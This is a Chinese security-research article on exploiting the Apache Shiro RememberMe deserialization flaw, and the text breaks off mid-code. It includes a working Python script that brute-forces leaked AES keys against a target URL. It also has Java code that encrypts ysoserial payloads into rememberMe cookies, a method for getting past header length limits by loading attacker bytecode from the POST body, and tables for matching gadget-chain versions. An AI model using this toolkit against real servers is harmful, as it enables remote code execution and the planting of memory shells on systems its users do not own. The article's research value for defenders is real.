**作者：Veraxy@QAX CERT  
原文链接：**
Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。目前在Java
web应用安全框架中，最热门的产品有Spring
Security和Shiro，二者在核心功能上几乎差不多，但Shiro更加轻量级，使用简单、上手更快、学习成本低，所以Shiro的使用量一直高于Spring
Security。产品用户量之高，一旦爆发漏洞波及范围相当广泛，研究其相关漏洞很有必要，本文主要探讨Shiro反序列化漏洞利用思路及工具编写，如有不足之处，欢迎批评指正。
# 0x01Shiro反序列化漏洞
## **漏洞原理**
Apache
Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie，在服务端接收cookie值后，Base64解码-->AES解密-->反序列化。攻击者只要找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化-->AES加密-->Base64编码，然后将其作为cookie的rememberMe字段发送，Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞。
Shiro 1.2.4版本默认固定密钥：
**Shiro框架默认指纹特征** ：
在请求包的Cookie中为?rememberMe字段赋任意值，收到返回包的 Set-Cookie
中存在?rememberMe=deleteMe?字段，说明目标有使用Shiro框架，可以进一步测试。
# 0x02 **漏洞利用**
## **2.1 AES密钥**
Shiro
1.2.4及之前的版本中，AES加密的密钥默认硬编码在代码里（[SHIRO-550](https://issues.apache.org/jira/browse/SHIRO-550)），Shiro
1.2.4以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。
有很多开源的项目内部集成了shiro并二次开发，可能会重现低版本shiro的默认固定密钥风险。例如[Guns开源框架](https://github.com/stylefeng/Guns)内部集成了shiro并进行二次开发，作者自定义密钥并固定，此时用户若不对密钥进行修改，即使升级shiro版本，也依旧存在固定密钥的风险。([相关issues地址](https://github.com/stylefeng/Guns/issues/48)：https://github.com/stylefeng/Guns/issues/48)
开发者在使用shiro时通常会找一些教程来帮助快速搭建，针对教程中自定义的密钥未修改就直接copy过来的情况也比较常见。
经过以上分析，升级shiro版本并不能根本解决反序列化漏洞，代码复用会直接导致项目密钥泄漏，从而造成反序列化漏洞。针对公开的密钥集合，我们可以在github上搜索到并加以利用。【搜索关键词："securityManager.setRememberMeManager(rememberMeManager);
Base64.decode("或"setCipherKey(Base64.decode("】
## **2.2 目标AES密钥判断**
收集到了密钥集合，接下来要对目标进行密钥判断，我们如何获知选择的密钥是否与目标匹配呢？文章[一种另类的 shiro
检测方式](https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ)提供了思路，当密钥不正确或类型转换异常时，目标Response包含Set-Cookie：rememberMe=deleteMe字段，而当密钥正确且没有类型转换异常时，返回包不存在Set-Cookie：rememberMe=deleteMe字段。接下来对这两种情况简单分析一下：
**1）密钥不正确**
Key不正确，解密时org.apache.shiro.crypto.JcaCipherService#crypt抛出异常
进而走进org.apache.shiro.web.servlet.impleCookie#removeFrom方法，在返回包中添加了rememberMe=deleteMe字段
于是获得的返回包包含了Set-Cookie：rememberMe=deleteMe字段。
**2）类型转换异常**
org.apache.shiro.mgt.AbstractRememberMeManager#deserialize进行数据反序列化，返回结果前有对反序列化结果对象做PrincipalCollection的强制类型转换。
可以看到类型转换报错，因为我们的反序列化结果对象与PrincipalCollection并没有继承关系
反序列化方法捕获到该异常，后面是熟悉的代码
再次走到org.apache.shiro.web.servlet.SimpleCookie#removeFrom方法，为返回包添加了rememberMe=deleteMe字段
获得与第一种情况一样的返回包。
根据上面的分析，我们需要构造payload排除类型转换错误，进而准确判断密钥。当序列化对象继承PrincipalCollection时，类型转换正常，SimplePrincipalCollection是已存在的可利用类。
创建一个SimplePrincipalCollection对象并将其序列化。
将序列化数据基于key进行AES加密并base64编码发起请求，当返回包不存在Set-Cookie：rememberMe=deleteMe字段时，说明密钥与目标匹配。
## **2.3 密钥判断脚本**
shiro在1.4.2版本之前， AES的模式为CBC，
IV是随机生成的，并且IV并没有真正使用起来，所以整个AES加解密过程的key就很重要了，正是因为AES使用Key泄漏导致反序列化的cookie可控，从而引发反序列化漏洞。在1.4.2版本后，shiro已经更换加密模式
AES-CBC为 AES-GCM，脚本编写时需要考虑加密模式变化的情况。
密钥集合我这里简单列举了几个，网上流传大量现成的Shiro key top 100集合，请自行查找替换。密钥判断脚本如下：
    import base64
    import uuid
    import requests
    from Crypto.Cipher import AES
    def encrypt_AES_GCM(msg, secretKey):
        aesCipher = AES.new(secretKey, AES.MODE_GCM)
        ciphertext, authTag = aesCipher.encrypt_and_digest(msg)
        return (ciphertext, aesCipher.nonce, authTag)
    def encode_rememberme(target):
        keys = ['kPH+bIxk5D2deZiIxcaaaA==', '4AvVhmFLUs0KTA3Kprsdag==','66v1O8keKNV3TTcGPK1wzg==', 'SDKOLKn2J1j/2BHjeZwAoQ==']     # 此处简单列举几个密钥
        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        file_body = base64.b64decode('rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==')
        for key in keys:
            try:
                # CBC加密
                encryptor = AES.new(base64.b64decode(key), mode, iv)
                base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(file_body)))
                res = requests.get(target, cookies={'rememberMe': base64_ciphertext.decode()},timeout=3,verify=False, allow_redirects=False)
                if res.headers.get("Set-Cookie") == None:
                    print("正确KEY ：" + key)
                    return key
                else:
                    if 'rememberMe=deleteMe;' not in res.headers.get("Set-Cookie"):
                        print("正确key:" + key)
                        return key
                # GCM加密
                encryptedMsg = encrypt_AES_GCM(file_body, base64.b64decode(key))
                base64_ciphertext = base64.b64encode(encryptedMsg[1] + encryptedMsg[0] + encryptedMsg[2])
                res = requests.get(target, cookies={'rememberMe': base64_ciphertext.decode()}, timeout=3, verify=False, allow_redirects=False)
                if res.headers.get("Set-Cookie") == None:
                    print("正确KEY:" + key)
                    return key
                else:
                    if 'rememberMe=deleteMe;' not in res.headers.get("Set-Cookie"):
                        print("正确key:" + key)
                        return key
                print("正确key:" + key)
                return key
            except Exception as e:
                print(e)
## **2.4 利用复现**
服务端接收rememberMe的cookie值后的操作是：Cookie中rememberMe字段内容 ---> Base64解密 --->
使用密钥进行AES解密 --->反序列化，我们要构造POC就需要先序列化数据然后再AES加密最后base64编码。
**1） 构造序列化数据**
下载ysoserial工具并打包：
    git clone https://github.com/frohoff/ysoserial.git
    cd ysoserial
    mvn package -DskipTests
生成的工具在target/目录下ysoserial-0.0.6-SNAPSHOT-all.jar文件，借助ysoserial工具生成序列化数据：
**2） 获取AES加密的密钥Key**
利用上文中编写的脚本来获取真实密钥。
**3） 生成rememberMe字段Payload**
前两步得到了序列化数据和正确密钥，对序列化数据基于密钥进行AES加密，base64编码生成payload，代码如下：
    package com.veraxy;
    import org.apache.shiro.crypto.AesCipherService;
    import org.apache.shiro.codec.CodecSupport;
    import org.apache.shiro.util.ByteSource;
    import org.apache.shiro.codec.Base64;
    import java.io.BufferedWriter;
    import java.io.FileWriter;
    import java.nio.file.FileSystems;
    import java.nio.file.Files;
    public class ShiroRememberMeGenPayload {
        public static void main(String[] args) throws Exception {
            byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath("xxx/xxx/test.ser"));
            AesCipherService aes = new AesCipherService();
            byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));
            ByteSource ciphertext = aes.encrypt(payloads, key);
            BufferedWriter out = new BufferedWriter(new FileWriter("payload.txt"));
            out.write(ciphertext.toString());
            out.close();
            System.out.printf("OK");
        }
    }
将payload添加至Cookie中的rememberMe字段值发起请求，成功反序列化对象并执行命令。
# 0x03 **进一步利用**
## **3.1 Payload长度限制**
简单分析一条TemplatesImpl的反序列化利用链CommonsBeanutils1，利用ysoserial工具生成序列化对象时，键入了一条命令，在getObject方法中接收command参数
跟进createTemplatesImpl方法，找到了实际执行的代码，插入了java.lang.Runtime.getRuntime().exec()来执行命令，那我们替换cmd参数值就可以执行任何代码，比如内存马
shiro反序列化漏洞常规利用点在数据包的header头中，在这里直接插入目标代码，生成的payload是很长的，肯定会超过中间件 header
长度限制，如何解决这个问题呢？
文章[Java代码执行漏洞中类动态加载的应用](https://mp.weixin.qq.com/s?__biz=MzAwNzk0NTkxNw==&mid=2247484622&idx=1&sn=8ec625711dcf87f0b6abe67483f0534d&chksm=9b772f1cac00a60aa465a54bd00751c563f2125c78cc1bbca35c760236e4f67d00671de4496c&scene=126&sessionid=1599445076&key=acec999da27edd25eccc957924f4afa7028aec867e42231763ca219c4505e3d6435f346a8463866e7dc0c19a39a3e0600c538e7202ced833a90e6b7910c12b1859ceeaf33f7222bbee4c2acf2953d8dadf304092bebf5d852fbef62087d185eeae0dc9ee37dcd1e02065ea59869b19c78590fb273ffc696c8a9e08793220b82a&ascene=1&uin=NzUwNTE0NzE4&devicetype=Windows+10+x64&version=62090529&lang=zh_CN&exportkey=A%2FH1km1FzCFyhVMsg9e0Izc%3D&pass_ticket=q0CeoTXZ1bV6z466jICgYA%2ByITdSiD5C8i%2FcAgax7OYgTP7U4OVpwP0Xt5Mdan2e&wx_header=0)提供了思路，将要加载的字节码放到post请求携带的data数据包中，header头中的payload仅仅实现读取和加载外部字节码的功能，接下来动手操作：
1）打开ysoserial源码，pom文件中添加依赖：
2）自定义ClassLoader，获取上下文request中传入的参数值，并实现动态加载外部字节码。
重载createTemplatesImpl方法，参数设置为要让服务端加载的类，_bytecodes参数携带要加载的目标类字节码
修改该payload的getObject方法，让createTemplatesImpl方法加载我们自定义的ClassLoader
重新打包ysoserial，生成序列化数据
拿出上文中写好的生成rememberMe字段Payload的脚本，基于ysoserial生成的序列化数据和已知key生成Payload，作为请求包Cookie中rememberMe的参数值。
接下来需要在POST请求包携带的data数据中插入要加载的字节码，这里选择延时代码进行测试：
    public class SleepTest {
        static{
            try {
                long aaa = 20000;
                Thread.currentThread().sleep(aaa);
            } catch (Exception e) {
            }
        }
    }
将目标类编译并base64之后作为c的参数值发起请求，看到系统执行了延时代码。
接下来就可以根据具体需求替换c的参数值了，比如内存马等其他体积庞大的字节码数据。
## **3.2 SUID不匹配**
反序列时, 如果字节流中的serialVersionUID与目标服务器对应类中的serialVersionUID不同时就会出现异常，造成反序列化失败。
SUID不同是jar包版本不同所造成，不同版本jar包可能存在不同的计算方式导致算出的SUID不同，这种情况下只需要基于目标一样的jar包版本去生成payload即可解决异常，进而提升反序列化漏洞利用成功率。
由于不知道目标服务器的依赖版本,
所以只有使用该依赖payload对所有版本目标进行测试，确认payload版本覆盖程度，排除SUID不匹配异常后，得到可利用payload集合。
# 0x04 **工具编写**
师傅们一再强调Shiro本身不存在可利用链，反序列化漏洞可被利用的原因是部署Shiro的网站引入了可利用的依赖包，所以思维不能局限于Shiro本身，它只是个切入点，而可利用链还要进一步确认。
## **4.1 大概思路**
完全不出网的场景，一些需要出网的gadget就暂时不考虑了，常见的TemplatesImpl的反序列化利用链有CommonsBeanutils1、CommonsCollections4、CommonsCollections10、Hibernate1、Jdk7u21。
**1）确认SUID不匹配的版本**
比如Hibernate1中SUID不匹配的问题就比较常见
**payload** **版本** | **适用目标依赖版本** |  
---|---|---  
hibernate-core 4.2.21.Final | 4.2.11.Final- 4.2.21.Final |  
hibernate-core 4.3.11.Final | 4.3.5.Final- 4.3.11.Final |  
hibernate-core 5.0.0.Final | 5.0.0.Final |  
hibernate-core 5.0.1.Final | 5.0.1.Final- 5.0.3.Final |  
hibernate-core 5.0.7.Final | 5.0.7.Final- 5.0.12.Final |  
hibernate-core 5.1.0.Final | 5.1.0.Final- 5.1.17.Final |  
hibernate-core 5.2.0.Final | 5.2.0.Final- 5.2.8.Final |  
hibernate-core 5.2.9.Final | 5.2.9.Final - 5.2.18.Final、5.3.0.Final -5.3.18.Final、5.4.0.Final - 5.4.3.Final |  
hibernate-core 5.4.4.Final | 5.4.4.Final- 5.4.21.Final |  
每个链基于确认好的版本分别生成序列化数据做积累，随后用脚本遍历这些序列化数据生成payload，对目标进行依赖和版本探测。
**2）探测并生成可用payload**
把上文写的爆破密钥的脚本集成进来，先确认目标的真实密钥，随后在POST请求包携带的data数据中插入延时代码，遍历积累的序列化数据作为POST请求包Cookie字段中rememberMe参数值，探测目标存在的利用链及依赖版本。
运行启动脚本，随着不断的探测，命令行界面输出目标真实密钥和适配目标可用的payload，根据提示把可用payload粘贴到请求包Cookie字段。
参考前文利用复现的流程，修改POST请求包，用生成的Payload填充Cookie字段中rememberMe参数值，POST请求包携带的data数据中添加c参数，参数值自选，比如我这里仍旧插入延时探测的字节码。
## **4.2 尝试优化**
上文提到利用链多个版本的序列化数据需要手动生成，耗时耗力，萌生了优化生成多版本序列化数据的过程并集成至工具中的想法。
我们想要实现ysoserial工具每个利用链批量化的基于多个版本的依赖生成payload，降低人力消耗。例如ysoserial中的工具链CommonsBeanutils1分别基于1.9.2版本和1.8.3版本生成payload，ysoserial-0.0.6-SNAPSHOT-all.jar开放版本参数来生成指定版本的payload：
    Java -jar ysoserial-0.0.6-SNAPSHOT-all.jar   CommonsBeanutils1 cb-1.9.2 “Calc”
    Java -jar ysoserial-0.0.6-SNAPSHOT-all.jar   CommonsBeanutils1 cb-1.8.3 “Calc”
maven打包工具jar时，pom文件同时加载多个版本依赖会产生版本冲突，如何实现设想呢？可以尝试自定义类加载器(ClassLoader)动态加载外部依赖，从而摆脱maven打包时依赖版本冲突的限制。
Java提供给我们一个自定义ClassLoader的工具类URLClassLoader，专门用于加载本地或网络的?class
或jar文件，例如想要加载本地磁盘上的类：
    public static void main(String[] args) throws Exception{
      File file = new File("d:/");
      URI uri = file.toURI();
      URL url = uri.toURL();
    URLClassLoader classLoader = new URLClassLoader(new URL[]{url});    Class aClass = classLoader.loadClass("com.veraxy.Demo");
       Object obj = aClass.newInstance();
     }
接下来动手修改ysoserial，打开ysoserial源码。
1）编写自定义UrlClassLoaderUtils工具类，加载指定位置外部依赖。
    package ysoserial;
    import java.io.File;
    import java.net.URL;
    import java.net.URLClassLoader;
    public class UrlClassLoaderUtils {
        public URLClassLoader urlClassLoader;
        public URLClassLoader loadJar(String gadgetName) throws Exception {
            File[] jarspath = getJarsPath(gadgetName);
            try{